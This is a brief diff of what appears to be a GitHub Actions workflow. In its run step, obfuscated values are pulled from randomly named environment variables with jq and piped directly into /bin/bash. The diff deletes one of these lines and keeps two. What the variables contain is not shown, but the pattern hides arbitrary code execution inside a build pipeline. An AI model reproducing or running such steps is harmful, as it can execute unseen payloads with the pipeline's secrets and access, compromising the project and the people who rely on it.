@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$d5" | jq -r .xrjv861 | /bin/bash
           echo $fgyn25 | jq -r .gjr344 | /bin/bash
-          echo $pyns0951 | jq -r .c99 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
